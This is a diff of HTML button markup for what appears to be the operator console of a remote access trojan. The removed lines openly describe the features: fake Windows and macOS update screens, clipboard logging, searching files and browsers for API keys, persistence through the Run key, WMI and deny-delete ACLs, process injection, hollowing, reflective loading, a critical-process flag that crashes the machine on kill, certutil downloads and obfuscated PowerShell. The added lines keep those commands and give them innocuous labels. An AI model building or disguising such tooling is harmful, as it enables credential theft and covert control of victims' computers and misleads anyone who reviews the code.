@@ -416,27 +416,27 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <button type="button" class="cmd-btn" onclick="sendCmd('net user')">net user <span>List users</span></button>
 <button type="button" class="cmd-btn" onclick="sendCmd('qwinsta')">qwinsta <span>Remote sessions</span></button>
 <button type="button" class="cmd-btn" onclick="sendCmd('schtasks /query /fo LIST')">Scheduled Tasks <span>Task scheduler</span></button>
-<button type="button" class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('DISABLE_INPUT')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Enable Input <span>Restore keyboard + mouse</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('WINDOWS_UPDATE')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
+<button type="button" class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('BLOCK_UI')">🚫 Block Input <span>Block user input</span></button>
+<button type="button" class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Allow Input <span>Restore user input</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('SHOW_SPLASH')">🪟 System Update <span>Show system update screen</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Device Update <span>Show device update screen</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Close Update <span>Close system update screen</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIP_HIST')">📋 Clipboard History <span>View clipboard history</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find Config Files <span>Search for configuration files</span></button>
 <button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
-<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('PROTECT_PROCESS')">🔒 Spawn Protected Copies <span>Auto-applies ALL layers: Run key, Task, WMI, Injection, NTFS — auto-protect after 15s</span></button>
-<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Protect Now <span>Immediately mark this process CRITICAL (BSOD on kill)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('UNINSTALL')">💀 UNINSTALL <span>Remove ALL persistence and kill all processes (no respawn)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('UNPROTECT_PROCESS')">🔓 Unprotect Process <span>Remove critical flag from this client</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('CHECK_PROTECTION')">🛡️ Check Protection <span>Query if this process is critical (safe, no BSOD)</span></button>
-<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('WMI_PERSISTENCE')">🔱 WMI Persistence <span>root/subscription: triggers every 30s</span></button>
-<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#009688;" onclick="sendCmd('INJECT_PROCESS')">💉 Inject Process <span>Inject payload into svchost/explorer (disk-based)</span></button>
-<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#00BCD4;" onclick="sendCmd('HOLLOW_PROCESS')">👻 Hollow Process <span>Fileless: spawn conhost.exe with our payload in memory</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a2a;border-color:#7B68EE;" onclick="sendCmd('REFLECT_LOAD')">🌙 Reflective Load <span>Inject full PE into explorer.exe — no CreateProcess</span></button>
-<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#FF9800;" onclick="sendCmd('HARDEN_FILES')">🛡️ Harden Files <span>NTFS ACLs: deny delete</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#00FF00;" onclick="sendCmd('VERIFY_LAYERS')">✅ Verify Layers <span>Check all persistence layers</span></button>
-<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('LOLBAS_DOWNLOAD '+url+' '+path)">🎭 LOLBAS Download <span>certutil download</span></button>
-<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('OBFUSCATE_PS '+cmd)">📝 Obfuscate PS <span>Base64 encode</span></button>
+<button type="button" class="cmd-btn" style="background:#2a0a0a;border-color:#f44336;" onclick="sendCmd('DEPLOY_SVC')">🔒 Deploy Services <span>Deploy background services and monitoring</span></button>
+<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#ff5722;" onclick="sendCmd('PROTECT_NOW')">⚡ Set Critical <span>Set system-critical status</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('Clean Up')">💀 Clean Up <span>Remove all services and exit</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="sendCmd('REMOVE_SVC')">🔓 Clear Critical <span>Clear system-critical status</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="sendCmd('SVC_STATUS')">🛡️ Check Status <span>Check system status</span></button>
+<button type="button" class="cmd-btn" style="background:#1a0a2a;border-color:#9C27B0;" onclick="sendCmd('SCHEDULE_TASK')">🔱 Schedule Task <span>System monitoring task</span></button>
+<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#009688;" onclick="sendCmd('REMOTE_SVC')">💉 Remote Service <span>Start remote service</span></button>
+<button type="button" class="cmd-btn" style="background:#0a2a2a;border-color:#00BCD4;" onclick="sendCmd('MEM_SVC')">👻 Memory Service <span>Start memory-resident service</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a2a;border-color:#7B68EE;" onclick="sendCmd('DLL_LOAD')">🌙 Library Load <span>Load library into process</span></button>
+<button type="button" class="cmd-btn" style="background:#2a1a0a;border-color:#FF9800;" onclick="sendCmd('HARDEN_FILES')">🛡️ Secure Files <span>Set file permissions</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#00FF00;" onclick="sendCmd('VERIFY_LAYERS')">✅ Verify Services <span>Check all services</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#2196F3;" onclick="var url=prompt('URL:'); var path=prompt('Save path:'); if(url&&path) sendCmd('DOWNLOAD_FILE '+url+' '+path)">🎭 Download File <span>Download via certutil</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#4CAF50;" onclick="var cmd=prompt('PowerShell command:'); if(cmd) sendCmd('ENCODE_CMD '+cmd)">📝 Encode Command <span>Base64 encode command</span></button>
 </div>
 </div>
 </div>
